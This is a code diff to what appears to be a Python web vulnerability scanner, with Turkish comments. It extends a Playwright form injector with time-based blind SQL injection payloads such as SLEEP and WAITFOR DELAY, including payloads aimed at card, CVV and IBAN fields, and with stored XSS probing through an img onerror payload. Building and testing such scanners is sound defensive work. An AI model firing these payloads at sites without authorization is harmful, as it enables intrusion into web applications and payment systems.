@@ -797,15 +797,15 @@ _TAG_FIELDS_JS = """
                         && cs.visibility !== 'hidden' && cs.display !== 'none';
         const tag = el.tagName.toLowerCase();
         const type = (el.getAttribute('type') || (tag === 'textarea' ? 'textarea' : 'text')).toLowerCase();
-        let formIndex = -1;
-        if (el.form) formIndex = forms.indexOf(el.form);
+        let formIndex = -1, formAction = '';
+        if (el.form) { formIndex = forms.indexOf(el.form); formAction = el.form.action || ''; }
         meta.push({
             idx: i, name: el.getAttribute('name') || '', id: el.id || '',
             type: type, tag: tag,
             placeholder: el.getAttribute('placeholder') || '',
             autocomplete: el.getAttribute('autocomplete') || '',
             aria: el.getAttribute('aria-label') || '',
-            formIndex: formIndex, visible: !!visible,
+            formIndex: formIndex, formAction: formAction, visible: !!visible,
             disabled: el.disabled === true, skip: skip.has(type)
         });
     });
@@ -885,12 +885,27 @@ def _payloads_for_context(context: str, marker: str, per_field: int = 2) -> List
     return out
 
 
+# Time-based (blind) SQLi denenecek bağlamlar + stored-XSS bağlamları.
+_SQLI_CONTEXTS = {"username", "email", "password", "card", "cvv", "iban",
+                  "expiry", "search", "generic"}
+_STORED_XSS_CONTEXTS = {"comment", "generic"}
+_TIME_SLEEP_SECONDS = 5
+
+
+def _timebased_payloads(context: str) -> List[str]:
+    """Bağlama göre zaman-geciktiren (SLEEP/WAITFOR) payload'lar. Kart/CVV gibi kısa
+    sayısal alanlarda tırnaksız+kısa varyant (maxlength budamasından kaçınmak için)."""
+    if context in ("card", "cvv", "iban", "expiry"):
+        return ["1 OR SLEEP(5)", "1 AND SLEEP(5)"]
+    return ["' OR SLEEP(5)-- -", "'; WAITFOR DELAY '0:0:5'-- "]
+
+
 @dataclass
 class InjectionFinding:
     url: str
     field_name: str
     field_context: str
-    vuln_type: str        # "XSS" | "SQLi"
+    vuln_type: str        # "XSS" | "XSS (Stored)" | "SQLi" | "SQLi (Blind/Time)"
     payload: str
     evidence: str
     severity: str = "High"
@@ -927,6 +942,7 @@ class BrowserFormInjector:
         self._findings: List[InjectionFinding] = []
         self._seen: Set[Tuple[str, str, str]] = set()
         self._deadline: float = 0.0
+        self._display_urls: List[str] = []  # stored-XSS doğrulamasında ziyaret edilecek sayfalar
 
     # -- yardımcılar --------------------------------------------------------
 
@@ -1088,31 +1104,39 @@ class BrowserFormInjector:
                 if self._over_budget():
                     return
                 context = _classify_input_context(target)
+                fname = target.get("name") or target.get("id") or f"#{target.get('idx')}"
+                # 1) Yansıyan XSS + error-based SQLi (hızlı, tek submit)
                 for vuln_type, payload in _payloads_for_context(
                         context, _MARKER, self.payloads_per_field):
                     if self._over_budget():
                         return
                     await self._attempt(page, page_url, fkey, group, target,
                                         context, vuln_type, payload, dialog_box)
+                # 2) Blind/time-based SQLi (kart/ödeme dahil) — error-based onaylanmadıysa
+                if context in _SQLI_CONTEXTS and not self._already(page_url, fname, "SQLi"):
+                    await self._attempt_time_based_sqli(
+                        page, page_url, fkey, group, target, context)
+                # 3) Stored (kalıcı) XSS — yansıyan XSS onaylanmadıysa, kalıcı bağlamlarda
+                if context in _STORED_XSS_CONTEXTS and not self._already(page_url, fname, "XSS"):
+                    await self._attempt_stored_xss(
+                        page, page_url, fkey, group, target, context, dialog_box)
 
-    async def _attempt(self, page, page_url: str, form_index: int,
-                       group: List[Dict[str, Any]], target: Dict[str, Any],
-                       context: str, vuln_type: str, payload: str,
-                       dialog_box: List[str]) -> None:
-        """Tek deneme: temiz sayfa → doldur → gönder → gözle."""
-        # zaten bu alan+tip için bulgu varsa atla
-        fname = target.get("name") or target.get("id") or f"#{target.get('idx')}"
-        if (page_url, str(fname), vuln_type) in self._seen:
-            return
+    def _already(self, page_url: str, fname: str, family: str) -> bool:
+        """Bu alan için verilen aileden (SQLi*/XSS*) bir bulgu zaten var mı?"""
+        return any(k[0] == page_url and k[1] == str(fname) and k[2].startswith(family)
+                   for k in self._seen)
+
+    async def _navigate_and_fill(self, page, page_url: str,
+                                 group: List[Dict[str, Any]],
+                                 target: Dict[str, Any], payload: str) -> bool:
+        """Temiz sayfaya git, alanları yeniden etiketle, grubu doldur (hedef=payload)."""
         try:
             await page.goto(page_url, timeout=self.config.timeout_ms,
                             wait_until="domcontentloaded")
             await page.wait_for_timeout(400)
             await page.evaluate(_TAG_FIELDS_JS)  # yeniden etiketle (indeks kararlı)
         except Exception:
-            return
-
-        # grup alanlarını doldur (hedef=payload, diğerleri=benign)
+            return False
         filled_target = False
         for fld in group:
             sel = f'[data-ws-fuzz="{fld.get("idx")}"]'
@@ -1128,15 +1152,135 @@ class BrowserFormInjector:
             else:
                 bctx = _classify_input_context(fld)
                 await self._type_into(el, _BENIGN_BY_CONTEXT.get(bctx, "test"))
+        return filled_target
 
-        if not filled_target:
+    async def _attempt(self, page, page_url: str, form_index: int,
+                       group: List[Dict[str, Any]], target: Dict[str, Any],
+                       context: str, vuln_type: str, payload: str,
+                       dialog_box: List[str]) -> None:
+        """Tek deneme: temiz sayfa → doldur → gönder → gözle (yansıyan XSS / error SQLi)."""
+        fname = target.get("name") or target.get("id") or f"#{target.get('idx')}"
+        if (page_url, str(fname), vuln_type) in self._seen:
             return
-
+        if not await self._navigate_and_fill(page, page_url, group, target, payload):
+            return
         dialog_box.clear()
         await self._submit_group(page, form_index, int(target.get("idx")))
         evidence = await self._observe(page, _MARKER, vuln_type, dialog_box)
         if evidence:
             self._record(page_url, target, context, vuln_type, payload, evidence)
+
+    def _mk_response_pred(self, page, action: str):
+        """Submit sonrası BEKLENECEK yanıtı eşleyen predicate (timing ölçümü için).
+        Form action yolu varsa onu, yoksa aynı-köken POST/PUT/PATCH yanıtını yakalar."""
+        base = page.url
+        action_path = ""
+        try:
+            if action:
+                action_path = urlparse(action).path
+        except Exception:
+            action_path = ""
+
+        def _pred(resp):
+            try:
+                u = resp.url
+                if not _in_scope(u, base):
+                    return False
+                if action_path and urlparse(u).path == action_path:
+                    return True
+                return resp.request.method in ("POST", "PUT", "PATCH")
+            except Exception:
+                return False
+        return _pred
+
+    async def _measure_submit(self, page, page_url: str, form_index: int,
+                              group: List[Dict[str, Any]], target: Dict[str, Any],
+                              payload: str) -> Optional[float]:
+        """Bir payload ile submit edip SUNUCU YANITI gelene kadar geçen süreyi (sn) ölç."""
+        if not await self._navigate_and_fill(page, page_url, group, target, payload):
+            return None
+        action = target.get("formAction") or ""
+        start = _time.monotonic()
+        try:
+            async with page.expect_response(
+                    self._mk_response_pred(page, action),
+                    timeout=int((_TIME_SLEEP_SECONDS + 9) * 1000)) as ri:
+                await self._submit_group(page, form_index, int(target.get("idx")))
+            await ri.value
+        except Exception:
+            # eşleşen yanıt görülmediyse en azından load durumunu bekle
+            try:
+                await page.wait_for_load_state("load", timeout=14000)
+            except Exception:
+                pass
+        return _time.monotonic() - start
+
+    async def _attempt_time_based_sqli(self, page, page_url: str, form_index: int,
+                                       group: List[Dict[str, Any]],
+                                       target: Dict[str, Any], context: str) -> None:
+        """Blind/time-based SQLi: SLEEP(5) payload'ı baseline'dan ≥4sn yavaşsa + yeniden
+        doğrulanırsa onayla. Differential (jitter'a dayanıklı), kart/ödeme alanları dahil."""
+        if self._over_budget():
+            return
+        # baseline: zararsız değerle submit süresi
+        base_val = _BENIGN_BY_CONTEXT.get(context, "test")
+        base_t = await self._measure_submit(page, page_url, form_index, group, target, base_val)
+        if base_t is None or base_t > 9.0:  # çok gürültülü → güvenilmez, atla
+            return
+        thresh = float(_TIME_SLEEP_SECONDS) - 1.0  # 5sn sleep için ≥4sn delta
+        for p in _timebased_payloads(context):
+            if self._over_budget():
+                return
+            t1 = await self._measure_submit(page, page_url, form_index, group, target, p)
+            if t1 is None or (t1 - base_t) < thresh:
+                continue
+            # YENİDEN DOĞRULA — tek seferlik ağ tıkanmasını ele
+            t2 = await self._measure_submit(page, page_url, form_index, group, target, p)
+            if t2 is not None and (t2 - base_t) >= thresh:
+                self._record(
+                    page_url, target, context, "SQLi (Blind/Time)", p,
+                    f"Zaman-tabanlı: baseline={base_t:.1f}s, SLEEP({_TIME_SLEEP_SECONDS})"
+                    f"={t1:.1f}s/{t2:.1f}s (Δ≈{t1 - base_t:.1f}s) — doğrulandı",
+                )
+                return
+
+    async def _attempt_stored_xss(self, page, page_url: str, form_index: int,
+                                  group: List[Dict[str, Any]], target: Dict[str, Any],
+                                  context: str, dialog_box: List[str]) -> None:
+        """Stored (kalıcı) XSS: benzersiz marker'lı payload gönder, sonra görüntüleme
+        sayfalarına YENİDEN GİT (yeniden enjekte etmeden); marker'lı alert orada da
+        tetiklenirse payload kaydedilmiş demektir → kalıcı XSS."""
+        if self._over_budget():
+            return
+        marker = "WSSTOR" + "".join(_random.choice("ABCDEFGHJKMNPQRSTUVWXYZ23456789")
+                                    for _ in range(6))
+        payload = f'"><img src=x onerror=alert("{marker}")>'
+        if not await self._navigate_and_fill(page, page_url, group, target, payload):
+            return
+        dialog_box.clear()
+        await self._submit_group(page, form_index, int(target.get("idx")))
+        try:
+            await page.wait_for_timeout(700)
+        except Exception:
+            pass
+        # görüntüleme sayfalarına TAZE git → kalıcı içerik orada tetiklenir mi?
+        for disp in (self._display_urls or [page_url]):
+            if self._over_budget():
+                return
+            dialog_box.clear()
+            try:
+                await page.goto(disp, timeout=self.config.timeout_ms,
+                                wait_until="domcontentloaded")
+                await page.wait_for_timeout(800)
+            except Exception:
+                continue
+            if any(marker in (m or "") for m in dialog_box):
+                self._record(
+                    page_url, target, context, "XSS (Stored)", payload,
+                    f"Kalıcı XSS: payload {disp} sayfasında (yeniden enjekte edilmeden) "
+                    f"alert tetikledi (marker doğrulandı)",
+                )
+                return
 
     async def run(self, target: str, page_urls: List[str]) -> List[InjectionFinding]:
         if not _PLAYWRIGHT_AVAILABLE:
@@ -1149,6 +1293,8 @@ class BrowserFormInjector:
             if u and u not in ordered and _in_scope(u, target):
                 ordered.append(u)
         ordered = ordered[:self.max_pages]
+        # stored-XSS doğrulamasında bu sayfalara taze gidip marker'lı alert aranır
+        self._display_urls = list(ordered)
 
         self._deadline = _time.monotonic() + max(30, self.max_total_seconds)
 
